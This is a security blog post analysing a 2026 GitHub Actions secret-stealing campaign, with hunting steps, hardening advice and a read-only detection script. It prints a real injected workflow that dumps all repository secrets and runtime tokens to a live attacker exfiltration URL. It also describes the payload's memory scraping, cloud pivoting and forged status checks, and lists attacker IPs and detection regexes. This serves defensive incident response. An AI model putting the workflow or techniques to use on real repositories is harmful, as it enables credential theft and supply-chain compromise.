# GitHub Actions Secret Stealer (wfx): Hunt, Rotate, Harden - SecurityCipher

- **Source URL:** https://securitycipher.com/2026/11/12/github-actions-secret-stealer-wfx/
- **Fetched:** 2026-11-14
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/14983 (id 14983)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---

You wake up, skim your org's GitHub notifications, and nothing looks wrong. No failed builds. No Dependabot drama. Then someone pastes a pull request title: `docs: dependency audit notes`. Boring copy. Harmless branch name `wfx-docs`. Except it is not documentation. It is a botnet knocking on every repository a stolen personal access token can touch.

Starting 10 November 2026, a GitHub Actions secret stealer nicknamed **wfx** (tracked as **wfx-loot** for the archive name it can upload) ran through GitHub Actions and, in hundreds of cases, through `npm install` on developer laptops. Vendor counts disagree because they measure different things. Aikido cites **4,837** compromised accounts, **61,764** probed repositories, and **1,806+** places the payload actually executed. SafeDep counted **8,093** public default branches that received malicious commits. Both can be true at once.

## Start here

If you maintain anything on GitHub with Actions secrets or cloud OIDC trust, do this today, in order:

1. **Search every repo you can write to** (including collaborator and org access) for the probe title, branch `wfx-docs`, and commits `ci: refresh build cache` / `chore: add ci helper` / `chore: add dependency audit workflow` since 10 November. The fastest way: run our free, read-only [wfx\_hunt.py](https://github.com/securitycipher/wfx-defense-lab) with `python3 wfx_hunt.py --org your-org`.
2. **Look for missing Actions run numbers** beside those commits. Deleted run #1964 between #1963 and #1965 is the poster child. Git log alone is not enough when the attacker force-pushes a revert.
3. **Revoke the commit author's tokens** (PAT, OAuth apps, SSH keys, sessions) and enable 2FA. Probe-only victims still need this step.
4. **Rotate every secret and cloud role** the workflow could read, then hunt persistence (Azure `wfx-ci-*`, AWS trust policy edits, new IAM access keys).

This post adds what most roundups skip: live GitHub search numbers we reproduced on 12 November, a public victim diff you can read yourself, the difference between probe counts and execution counts, why GitHub's July workflow hold does not save private repos, and a read-only hunter you can run against your estate.

## Three numbers that are not the same thing

Headlines mix these up. Keep them separate when you brief leadership:

| Metric | What it means | Approximate scale (12 Nov) | 
|---|---|---|
| Probe pull requests | Stolen token confirmed write access | 64,596 PRs from branch wfx-docs (58,331 still open) | 
| Malicious commits | Payload landed on a branch, even if reverted | \~8,100 public default branches (SafeDep) | 
| Likely exfiltration | Workflow or hook actually ran | \~1,806+ (Aikido; undercount because logs were deleted) | 

We re-ran GitHub search with a read-only token the same day. Pull requests whose head branch is `wfx-docs` returned **64,596** total, **58,331** still open, **15,261** created on 10 November alone, and **46,463** on 11 November. Commits titled `ci: refresh build cache` jumped from dozens before 10 November to **22,284** afterward. That is not organic housekeeping.

## What the attack looks like in your inbox

The probe is intentionally dull. Branch `wfx-docs`, file `docs/wfx-audit.md` with two lines of text, PR title `docs: dependency audit notes`. Byte-identical across victims. It does not need a merge. It tells the operator the token still works.

Then comes the real payload, usually within a minute on repos where CI fires on push. Cleanup commit `ci: restore` (sometimes `ci: cleanup`) lands right after. In `drunomics/nuxtjs-drupal-ce` the gap between payload and restore was **12 seconds**, pushed by the project's bot account. Actions history jumps from run **#1963** to **#1965**. Run **#1964** is gone.

## Four ways the same bash payload hides

StepSecurity pulled 80+ commits. SafeDep broke delivery down by method. You need to hunt all four:

| Commit message | Where it lives | Runs on laptop? | 
|---|---|---|
| ci: refresh build cache | Two new steps on an existing workflow; adds statuses: write | No | 
| ci: refresh build cache | Payload appended to a shell file the workflow already runs (e.g. update.sh) | No | 
| chore: add dependency audit workflow | New .github/workflows/build-audit-xxxxxx.yml | No | 
| chore: add ci helper | Hidden .ci-xxxxxx.sh plus npm postinstall (or build/test hook) | Yes, on npm install | 

The fourth hiding place is easy to miss in grep-based hunts: `nextcloud/docker` kept a surviving run log showing `memscan_files 3`, `selfhosted_collected`, and a successful upload after the stealer was pasted into `update.sh`. High-star repos are not immune.

## Inside the workflow wrapper

Public commit `9b18a65` on `masterpranay1/Country-Quiz-Challenge` is a clean sample. The wrapper asks for OIDC and status permissions, copies Actions runtime tokens into the job environment, then hands the stealer JSON dumps of every secret and variable:

```
name: Dependency Audit y82c
on:
  push:
  workflow_dispatch:
permissions:
  contents: read
  actions: read
  id-token: write
  statuses: write
jobs:
  audit_base:
    runs-on: ubuntu-latest
    steps:
      - name: Pass runtime
        uses: actions/github-script@v7
        with:
          script: |
            const fs = require('fs');
            const ev = process.env;
            const keys = ['ACTIONS_RUNTIME_TOKEN','ACTIONS_RUNTIME_URL','ACTIONS_CACHE_URL','ACTIONS_RESULTS_URL'];
            const lines = keys.filter(k => ev[k]).map(k => k + '=' + ev[k]);
            if (lines.length) fs.appendFileSync(ev.GITHUB_ENV, lines.join('\n') + '\n');
      - name: Run audit
        env:
          WF_SECRETS: "${{ toJSON(secrets) }}"
          WF_VARS: "${{ toJSON(vars) }}"
          WF_CALLBACK: "http://194.150.166.244:8080/exfil"
          WF_CTOKEN: "b42d70a7aab9140ca19e8249"
          WF_MEMSCAN: "1"
        run: |
          # ~1,500 lines of bash: collect, OIDC exchange, cloud pivot, exfil, exit 0 or 42
```
The bash body is about **1,500 lines**, heavily commented, not obfuscated. Same script in every vector. It is closer to a red-team toolkit than a scraper.

## What wfx collects

- **Declared secrets:** `${{ toJSON(secrets) }}` and vars, plus runtime tokens copied out of the GitHub Actions environment.
- **Undeclared secrets:** a Python pass over `/proc/*/mem` targeting `Runner.Worker` and `Runner.Listener` for JWTs, PATs, AWS keys, and AI provider tokens.
- **Host stores:** `~/.aws`, Azure CLI caches, `~/.ssh`, npm and PyPI creds, kubeconfig, shell history, and a long list of AI tool env vars (OpenAI, Anthropic, Cursor, Copilot, and others).
- **Repo snapshot:** credential-shaped files, last 100 commits, recent workflow artifacts.
- **Self-hosted extras:** cloud instance metadata, Docker state, systemd units.

The install-hook variant never touches `toJSON(secrets)` in YAML. It still steals CI secrets from runner memory when CI runs, and it steals laptop-local keys when a developer installs dependencies.

## What wfx does after it steals

Collection is only phase one. The script mints GitHub OIDC tokens for AWS, Azure, and GCP audiences, chains into other IAM roles it finds in the repo, tries `iam:CreateAccessKey`, replays Azure FOCI refresh tokens against first-party Microsoft client IDs, and can add Azure federated credentials named `wfx-ci-*` that trust workflows on your default branch. That backdoor can survive a routine secret rotation.

Early in the run it can post forged `success` statuses using the names of your required checks. Classic branch protection matches required checks by context name, so merges can proceed while exfiltration continues. That is why the injected workflow adds `statuses: write`. Pinning a required check to an expected source app helps against outside tokens, but a status posted with the job's own `GITHUB_TOKEN` still comes from GitHub Actions. The real fix is keeping attacker YAML from running at all.

## Exfiltration: HTTP, Telegram, and the channels that were off

Most November samples POST gzipped archives to `194.150.166[.]244:8080/exfil`, `18.143.168[.]96:8080/exfil`, or `153.75.82[.]159:8080`. SafeDep saw about a fifth of a sample using **Telegram only**. From roughly 05:30 UTC on 12 November, StepSecurity watched newer samples upload with `sendDocument` to chat `-1004340163187` while setting the HTTP callback to `127.0.0.1`. IP blocklists miss that generation.

The script also knows how to hide loot in Actions cache keys, step summaries, artifacts named `wfx-loot-*`, base32-encoded run logs, and encrypted commits on throwaway branches. In the public wave, `WF_PRIVATE=0` disables the GitHub-native channels. That is why investigators kept saying *no artifact does not mean safe*.

## GitHub held some public runs. Private repos did not get that mercy

On 28 July 2026 GitHub began holding certain workflow runs on **public** github.com repositories as `action_required` until a write-capable human approves them. Wiz documented that this stopped the earlier Gheist `sync-check` mass dump on public repos. wfx is more surgical and still alive in private repositories, enterprise setups, and any public repo where nobody noticed a held run.

We pushed a harmless teaching repo, [securitycipher/wfx-defense-lab](https://github.com/securitycipher/wfx-defense-lab), with `toJSON(secrets)` demos. Both pushes landed at `action_required` with zero job logs. That is the control working. It is also a reminder: do not approve unfamiliar workflows just to clear the queue.

## Hunt with git log, activity, and run gaps

Most write-ups stop at "grep your workflows." That fails when the attacker force-pushes `ci: restore` within seconds. You need three data sources:

1. Commit history since 10 November (knowing it may be rewritten).
2. Repository activity feed for pushes that carried payload SHAs.
3. Actions runs: missing `run_number` sequences and runs whose `display_title` matches payload messages.

We wrote a read-only, standard-library-only hunter that checks all three and gives each repo an Affected / Probed / Review verdict with links to the evidence. It lives in [securitycipher/wfx-defense-lab](https://github.com/securitycipher/wfx-defense-lab) with an offline test suite and a scheduled-scan workflow. One file, Python 3.9+, nothing to install:

```
curl -fsSLO https://raw.githubusercontent.com/securitycipher/wfx-defense-lab/main/wfx_hunt.py
export GITHUB_TOKEN=github_pat_...   # optional; fine-grained, read-only
python3 wfx_hunt.py myorg/service-a  # one repo (a github.com URL works too)
python3 wfx_hunt.py --org myorg      # search the whole org, then deep-check
python3 wfx_hunt.py --user some-dev  # a personal account
python3 wfx_hunt.py --mine           # every repo the token can reach
python3 wfx_hunt.py --org myorg --all-repos --json wfx.json --markdown wfx.md
```
Without a token you get public repos and about 60 API requests an hour, which covers one or two repos. For private repos and big orgs, give it a fine-grained token with read-only Metadata, Contents, Pull requests, Actions, and Commit statuses. The exit code is the verdict: `0` nothing found, `1` review, `2` probed, `3` affected, `4` incomplete (rate limit or auth). Here it is on a confirmed victim:

Point it at an org and it runs GitHub search for probe PRs and payload commits across every repo first, then deep-checks the payload hits and the most recently pushed repos for activity-log payloads and deleted runs. On drunomics it flagged 53 probed repos from search alone and found the force-pushed `ci: refresh build cache` push and deleted run #1964 in the deep checks:

A clean repo exits `0`, so you can drop it into a nightly job that only goes red when something turns up. The repo ships that job as `examples/wfx-scan.yml`; vendor the script into your own repo rather than curling it from a branch at run time. You are defending against a CI supply-chain attack, so pin what your pipeline runs. Here is what that looks like in a real run. The repo has a manual `wfx-scan-demo` workflow that runs the same script; we pointed it at two victims and one clean repo:

The red X is the exit code doing its job. The `--markdown` report goes into `$GITHUB_STEP_SUMMARY`, and the JSON and Markdown files are kept as a run artifact:

The detection rules at the top of the script look like this:

```
PROBE_TITLE = "docs: dependency audit notes"
PAYLOAD_MSGS = ("ci: refresh build cache", "chore: add ci helper",
                "chore: add dependency audit workflow", "ci: cache")
SEARCHABLE_PAYLOAD = PAYLOAD_MSGS[:3]
CLEANUP_MSGS = ("ci: restore", "ci: cleanup")  # noisy alone, only meaningful next to a payload commit
BRANCH_RULES = [
    (re.compile(r"^wfx-docs$"), "probed", "Probe branch wfx-docs is still there"),
    (re.compile(r"^ci-\d+-[A-Za-z0-9_-]+-\d+$"), "affected", "Encrypted loot fallback branch"),
    (re.compile(r"^chore/[a-z0-9]{8}$"), "review", "Throwaway chore/xxxxxxxx branch (payload workflow pattern)"),
    (re.compile(r"^ci-check-\d{4}$"), "review", "October GhostAction-style branch"),
]
FILE_RULES = [
    (re.compile(r"(^|/)\.ci-[a-z0-9]{6}\.sh$"), "affected", "Hidden payload script"),
    (re.compile(r"^\.github/workflows/build-audit-[a-z0-9]{6}\.ya?ml$"), "affected", "Injected Dependency Audit workflow"),
    (re.compile(r"^docs/wfx-audit\.md$"), "probed", "Probe file docs/wfx-audit.md"),
    (re.compile(r"^\.ci/\d+-\d+\.bin$"), "affected", "Encrypted loot file"),
]
MARKERS = re.compile(r"WF_CTOKEN|WF_CALLBACK|WF_TG_BOTS|WF_MEMSCAN|WFXLOG-BEGIN|"
                     r"194\.150\.166\.244|18\.143\.168\.96|153\.75\.82\.159")
HOOK_RE = re.compile(r'"\w+"\s*:\s*"[^"]*\.ci-[a-z0-9]{6}\.sh')
# ... full script: https://github.com/securitycipher/wfx-defense-lab/blob/main/wfx_hunt.py
```
## Packages and bots that still matter

| Artifact | Why care | 
|---|---|
| Packagist digitalelvis/neuronai-studio 3.14.3 | npm install inside vendor runs the hook; composer alone does not | 
| Go github.com/onuragtas/docker-env v1.0.278 / v1.0.280 / v1.0.282 | Poisoned workflow only; Go builds do not run it, but tags shipped | 
| Go github.com/vkuznet/gocurl pseudo-version 8d5aad0 | Still on module proxy; workflow never ran but commit was not reverted | 
| webdriverio/\* via wdio-bot | 28 repos touched; treat bot token as stolen even without npm releases | 

## Hardening that actually matches the threat

This is not a setting you toggle once. It is a bundle:

- **Token hygiene:** delete classic PATs with repo admin and no expiry. Prefer fine-grained tokens and GitHub Apps with minimum permissions. Rotate anything tied to an account that opened a probe PR.
- **Environment gates:** production secrets live in protected environments with required reviewers, not repository-level secrets any workflow can read. Add a deployment branch policy so a job from a throwaway `chore/` branch is rejected before it ever sees those secrets.
- **OIDC scope:** trust policies must pin repository, environment, and ref. A token minted on `chore/evil` should not assume your AWS role.
- **Egress control:** blocked runners or Harden-Runner-style allowlists catch bare IP POSTs and `api.telegram.org` exfil. Memory scans need process monitoring, not just network rules.
- **Approval discipline:** treat held workflows like prod deploys. If you did not author the YAML, deny it.
- **Self-hosted runners:** ephemeral VMs, no Docker socket, no long-lived instance roles broader than the job.

Vendor tooling (StepSecurity secret exfiltration policies, GitGuardian, Aikido, SafeDep) helps, but the first move is still inventory: which humans and bots can push workflows to which repos, and which secrets those workflows read. For the wider pipeline picture, see our [software supply chain security guide](https://securitycipher.com/2026/08/10/software-supply-chain-security-2026/) and the [DevSecOps laptop-to-production pipeline](https://securitycipher.com/2026/08/27/devsecops-laptop-to-production/).

## Indicators worth blocking today

| Type | Value | 
|---|---|
| Network | 194.150.166\[.\]244:8080/exfil | 
| Network | 18.143.168\[.\]96:8080/exfil | 
| Network | 153.75.82\[.\]159:8080 | 
| Telegram | Chat -1004340163187 (per StepSecurity / SafeDep samples) | 
| SHA-256 | 89695abb392d5cfd4972672961e644bb46baa98aa1ed7173c2a2816c762735cf (script) | 
| Git | Branch wfx-docs; PR title docs: dependency audit notes | 
| Git | Commits ci: refresh build cache; chore: add ci helper; ci: restore | 

## Sources and further reading

## FAQ

## I reverted the malicious commit. Am I safe?

No. If the workflow ran before the revert, assume every secret that job could reach is gone, including ones you never referenced in the YAML. Rotation is not optional. Also check AWS and Azure for `wfx-ci-*` federated credentials and IAM trust policies opened to `"AWS": "*"`.

## We never merged the probe pull request. Does that mean nothing ran?

The probe only proves the account can write. Many victims got payload commits straight to the default branch without merging the PR. Any account that opened `docs: dependency audit notes` should be treated as compromised either way.

## Our repo has no wfx-loot artifact or wfx- cache entry.

In the November wave those GitHub-native exfil channels were switched off on public repos (`WF_PRIVATE=0`). Data left by plain HTTP POST or Telegram. Absence of an artifact does not mean absence of theft.

## Does GitHub block this on public repositories?

Since 28 July 2026, GitHub can hold flagged workflow runs as `action_required` until a human approves them. That helped against the simpler Gheist campaign. wfx still hurts private repos, org-owned internal repos, and any public repo where the run is not held or gets approved by mistake.

## We only use SSH deploy keys, not Actions secrets.

The stealer still wins if any workflow on the repo has cloud OIDC, registry tokens, or AI keys. It also scans runner memory and `/proc` for tokens other jobs left behind. Self-hosted runners with instance roles are especially juicy.

## What about the npm postinstall hook variant?

Anyone who ran `npm install` during the short window before `ci: restore` executed the same bash payload on a laptop. Treat that machine like a compromised runner.

## How is this related to GhostAction in October?

Many of the same accounts show up again, and in 100+ repos the November payload was stitched into October's `security-audit.yml` files. Researchers do not attribute both waves to one actor, but stolen tokens clearly circulate between campaigns.
